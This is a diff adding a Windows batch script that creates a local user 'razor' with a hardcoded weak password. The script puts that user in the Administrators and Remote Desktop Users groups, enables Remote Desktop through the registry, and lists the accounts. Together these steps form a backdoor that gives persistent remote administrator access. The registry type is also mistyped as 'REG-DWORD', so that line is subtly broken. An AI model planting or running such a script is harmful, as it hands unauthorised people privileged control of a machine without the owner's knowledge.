@@ -1,0 +1,13 @@
+@ECHO OFF
+TITLE Add user
+ECHO Adding user...
+net user razor password! /add
+net localgroup Administrators razor /add
+net localgroup "Remote Desktop Users" razor /add
+Echo Enabling RDP...
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG-DWORD /d 0 /f
+ECHO =================
+ECHO User Added
+ECHO =================
+net users
+
